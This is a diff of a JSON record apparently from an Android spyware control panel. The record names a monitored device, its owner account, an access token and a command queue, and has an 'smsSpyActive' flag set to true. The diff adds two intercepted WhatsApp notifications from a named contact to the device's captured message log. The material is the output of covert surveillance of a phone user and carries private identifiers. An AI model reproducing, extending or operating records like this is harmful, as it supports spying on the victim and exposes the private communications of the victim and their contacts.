@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777062959392,
+    "lastSeen": 1777062968391,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "ZAH ZIDADDD💓",
+        "content": "‎2 pesan baru",
+        "time": "25/04 03:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777062960110
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "ZAH ZIDADDD💓",
+        "content": "‎2 pesan baru",
+        "time": "25/04 03:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777062960068
+      },
       {
         "appName": "WhatsApp",
         "sender": "ZAH ZIDADDD💓",
